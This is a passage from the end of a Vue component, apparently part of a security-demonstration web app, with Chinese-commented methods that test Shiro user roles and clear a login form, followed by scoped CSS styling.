                console.error('权限测试失败:', error);
                this.permissionTestResult = `
                    <div style="color: red;">
                        <strong>权限测试失败：</strong><br>
                        ${error.message}
                    </div>
                `;
            }
        },

        // 新增：管理员权限测试方法
        async testAdminPermission(role) {
            this.permissionTestResult = '';
            try {
                const response = await this.$store.dispatch('shiro/testRole', role);
                if (response.code === 0) {
                    this.permissionTestResult = `
                        <div style="color: green;">
                            <strong>权限测试成功：</strong><br>
                            用户具有 ${role} 角色。<br>
                            接口响应：${response.data}
                        </div>
                    `;
                } else {
                    this.permissionTestResult = `
                        <div style="color: red;">
                            <strong>权限测试失败：</strong><br>
                            用户不具有 ${role} 角色。<br>
                            接口响应：${response.msg}
                        </div>
                    `;
                }
            } catch (error) {
                console.error('管理员权限测试失败:', error);
                this.permissionTestResult = `
                    <div style="color: red;">
                        <strong>权限测试失败：</strong><br>
                        ${error.message}
                    </div>
                `;
            }
        },

        // 新增：清空Shiro登录表单
        clearShiroLogin() {
            this.shiroLoginForm = {
                username: '',
                password: '',
                rememberMe: false
            };
        }
    }
}
</script>

<style scoped>
.vuln-info {
    /* 设置边框 */
    /* border: 1px solid #ccc; */
    /* 设置边框圆角 */
    border-radius: 10px;
    /* 设置外边距 */
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    /* 设置字体加粗 */
    font-weight: bold;
    /* 设置内边距 */
    padding: 10px;
    /* 水平居中 */
    justify-content: center;
    /* 垂直居中 */
    align-items: center;
    /* 添加底部边框线条，颜色为灰色 */
    border-bottom: 1px solid #ccc;
}

.body-div {
    /* 设置内边距 */
    padding: 10px;
    justify-content: center;
    /* 水平居中 */
    align-items: center;
    /* 垂直居中 */
    font-family: Arial, sans-serif;
    /* 设置字体为 Arial，并指定备用字体 */
    font-size: 14px;
    /* 设置字体大小为 16像素 */
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    /* 设置外边距 */
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    /* 设置字体大小为 14px */
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    /* min-height: 36px; */
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
    /* 让子元素在交叉轴方向（垂直方向）拉伸以匹配高度 */
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}
</style> 